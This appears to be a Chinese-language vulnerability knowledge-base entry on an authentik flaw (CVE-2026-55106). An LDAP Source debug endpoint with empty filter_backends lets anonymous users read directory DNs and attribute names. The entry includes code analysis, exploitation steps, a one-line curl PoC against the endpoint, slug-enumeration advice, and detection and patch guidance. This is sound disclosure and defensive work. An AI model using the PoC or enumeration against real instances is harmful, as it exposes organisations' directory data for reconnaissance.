---
id: web-python-framework-authentik-ldap-debug-filter-backends-bypass
title: authentik LDAP Source debug 接口 filter_backends 置空导致匿名越权读取目录元数据（CVE-2026-55106）
type: scenario
domain: web
path: web/python/framework
technique: drf-detail-action-empty-filter-backends-object-authz-bypass
aliases:
- CVE-2026-55106
- GHSA-h8ff-c3h7-2gf8
- authentik LDAP debug 越权
- DRF filter_backends 空列表越权
- LDAP Source debug 未授权读取
tags:
- django
- drf
- authentik
- authorization
- idor
- object-permission
- ldap
- info-leak
- cve-2026-55106
cve:
- CVE-2026-55106
severity: medium
confidence: high
status: verified
affected_versions: authentik <= 2026.2.5、<= 2026.5.4；修复于 2026.2.6、2026.5.5
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:15+08:00'
  notes: 已对照原文全文与 5 张截图核对：detail action filter_backends 为空、ObjectFilter 收敛、DRF get_object 顺序、匿名 200 与 users/groups/membership 样本、补丁改回 ObjectFilter 均一致。未验证点：未复跑 Docker；返回不含属性值与 bind 密码，medium 定级合理。
---

## 一句话结论

authentik 的 `GET /api/v3/sources/ldap/{slug}/debug/` 是一个 DRF `detail=True` action，脆弱版本把它的 `filter_backends` 写成空列表，使 `self.get_object()` 不再经过 `ObjectFilter` 的对象级授权收敛；未认证攻击者只要知道/猜到某个已配置 LDAP Source 的 `slug`，就能让服务端以该 Source 的 bind 身份访问上游 LDAP，并返回用户、组、成员关系的真实 DN 与属性名样本。

## 原理

- authentik 的 detail 读取授权不是依赖末尾的 `check_object_permissions()`，而是依赖 `ObjectFilter` 先把 queryset 收敛到“当前请求者可见对象”：
  ```python
  class ObjectFilter(ObjectPermissionsFilter):
      def filter_queryset(self, request, queryset, view):
          permission = self.perm_format % {...}
          if request.user.has_perm(permission):
              return queryset
          if owner_field := getattr(view, "owner_field", None):
              return queryset.filter(**{owner_field: request.user})
          queryset = super().filter_queryset(request, queryset, view)
          ...
          if not queryset.exists():
              raise PermissionDenied()
          return queryset
  ```
  没有全局权限时，它调用 `get_objects_for_user` 做对象级过滤；过滤后为空则直接 `PermissionDenied`。
- DRF `GenericAPIView.get_object()` 的顺序是：
  ```python
  queryset = self.filter_queryset(self.get_queryset())   # 先套 filter_backends
  obj = get_object_or_404(queryset, **filter_kwargs)      # 再按 lookup_field 取对象
  self.check_object_permissions(self.request, obj)        # 最后才是对象权限 hook
  ```
  因此 `filter_backends` 是 detail lookup 的前置授权边界，而不是附加过滤。
- authentik 默认 `DEFAULT_PERMISSION_CLASSES` 为 `authentik.rbac.permissions.ObjectPermissions`：对带 `lookup_field` 的 detail 请求直接放行 `has_permission()`，读取授权主要交给 `ObjectFilter`；继承的 `DjangoObjectPermissions` 对 `GET`/`HEAD`/`OPTIONS` 的对象权限映射本身是空列表。也就是说 `ObjectFilter` 是该接口 detail 读取的主检查点。
- 脆弱版本 `debug` 的装饰器写成 `filter_backends=[]`：
  ```python
  @action(methods=["GET"], detail=True, pagination_class=None, filter_backends=[])
  def debug(self, request, slug):
      source = self.get_object()          # 在 LDAPSource.objects.all() 上按 slug 直接取
      for sync_class in SYNC_CLASSES:     # 复用正式同步器
          for page in sync_class(source, Task()).get_objects(size_limit=10):
              ...
  ```
  同类的 `sync_status` 则写了 `filter_backends=[ObjectFilter]`，说明该 viewset 原本就靠这条链保护 detail action；只有 `debug` 被单独移出。
- 能力放大点：`BaseLDAPSynchronizer.__init__` 里 `self._connection = source.connection()`，而 `LDAPSource.connection()` 会把 `bind_cn`/`bind_password` 塞进 `ldap3.Connection` 并执行 `bind()`。攻击者本身没有 LDAP 凭据，但越权取到 `source` 后即可让服务端代其绑定并查询上游 LDAP。
- 返回内容：`users`/`groups`/`membership` 三类对象，来自 `UserLDAPSynchronizer`/`GroupLDAPSynchronizer`/`MembershipLDAPSynchronizer` 的真实查询（`search_base` 来自 source 的 `base_dn`+`additional_*_dn`，`search_filter` 来自 source 的 object filter），每类最多取 10 条；返回前仅 `pop("raw_attributes")` 与 `pop("raw_dn")`。因此泄露的是正式同步视图的裁剪样本，包含真实 DN、属性名集合、组对象与成员关系字段。

## 触发条件

- 目标 authentik 版本 ≤ 2026.2.5 或 ≤ 2026.5.4。
- 实例已配置至少一个 LDAP Source（否则没有可取的 `slug`）。
- 攻击者能访问 authentik API（`/api/v3/`）。
- 攻击者知道或能猜到某个 Source 的 `slug`（常见低熵命名如 `corp-ldap`、`ad`、`employees`；也可从文档、日志、截图中获取）。
- 不需要登录、不需要 LDAP 凭据、不需要管理员权限。

## 利用步骤

1. 探测/猜测目标 authentik 实例上已配置的 LDAP Source `slug`。
2. 直接发起匿名请求：`GET /api/v3/sources/ldap/{slug}/debug/`，不携带 Cookie、Token 或 `Authorization`。
3. 脆弱版本返回 `200 OK`，响应体包含 `users`、`groups`、`membership` 三类数组。
4. 从返回中提取真实 DN（如 `uid=alice,ou=users,dc=example,dc=org`）、组 DN、属性名（`mail`、`member`、`userPassword`、`entryUUID` 等）、成员关系字段。
5. 用这些元数据做目录结构侦察、用户名/组名样本收集，为后续口令喷洒、LDAP 注入或社工提供输入。
6. 对多个 `slug` 快速枚举，扩大可读取的 Source 范围。

## PoC

```bash
curl -i -sS "http://target:9000/api/v3/sources/ldap/corp-ldap/debug/"
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
Allow: GET, HEAD, OPTIONS

{
  "users": [
    {
      "dn": "uid=alice,ou=users,dc=example,dc=org",
      "attributes": ["objectClass","cn","sn","uid","mail","userPassword","structuralObjectClass","entryUUID"]
    }
  ],
  "groups": [
    {
      "dn": "cn=engineering,ou=groups,dc=example,dc=org",
      "attributes": ["objectClass","cn","member","structuralObjectClass"]
    }
  ],
  "membership": [...]
}
```

```text
# 匿名请求无 Cookie/Token/Authorization，仍返回 200
# summary: {"keys":["groups","membership","users"],"users":2,"groups":1,"membership":1}
```

## 变体与关联

- 变体：同一产品内其他 `detail=True` action 若也覆写 `filter_backends` 为更弱配置，且方法体调用 `self.get_object()` 后触发敏感外部动作，可按同一模式审计（见检测与防御的检查点）。
- 变体：`slug` 可预测时可批量枚举；若实例多租户，注意脚本默认取第一个 `ready` tenant，实际目标需按租户定位。
- 关联：DRF 项目中更一般的“detail action 越权”模式；`get_object()` 之前没有 queryset 收敛 + 对象权限 hook 对 GET 为空列表，二者叠加即越权。
- 边界：返回不包含 bind 密码，也不直接回显属性值；`userPassword` 只说明属性名存在，不代表密码/hash 泄露。定级为中危信息泄露，不是直接接管。
- 关联：若目标同时开放其他 debug/preview/test 接口，常出现同类“诊断功能绕过授权链”问题。

## 检测与防御

- 升级：authentik ≥ 2026.2.6 或 ≥ 2026.5.5；补丁即把 `debug` 的 `filter_backends` 改回 `[ObjectFilter]`。
- 加固：所有 `@action(detail=True)` 必须显式使用与同类 action 一致的对象权限过滤；不要用 `filter_backends=[]` 关闭授权链。
- 加固：对驱动外部连接对象（LDAP/AD/SMTP/云 API）执行敏感动作的接口，严格执行“先对象级授权、后解析对象、再执行动作”的顺序。
- 加固：调试/预览/测试类接口仅对管理网段开放，或默认下线；`slug` 不能当作安全边界。
- 检测：`/api/v3/sources/ldap/<slug>/debug/` 的访问日志；未携带认证信息却返回 200 的请求；同一来源对多个 `slug` 的快速探测；扫描器 UA、异常出口 IP 访问调试接口。
- 检测：回归测试应覆盖“匿名 → 403”“已登录但无对象权限 → 403”“有权限 → 200”三种主体，防止后续改动再次拆掉权限链。
- 审计要点（可迁移到任意 DRF 项目）：同时满足 `detail=True` action 覆写 `filter_backends`、方法体调用 `self.get_object()`、取到对象后立即触发外部访问/调试预览/测试连接等敏感动作，即高风险候选。
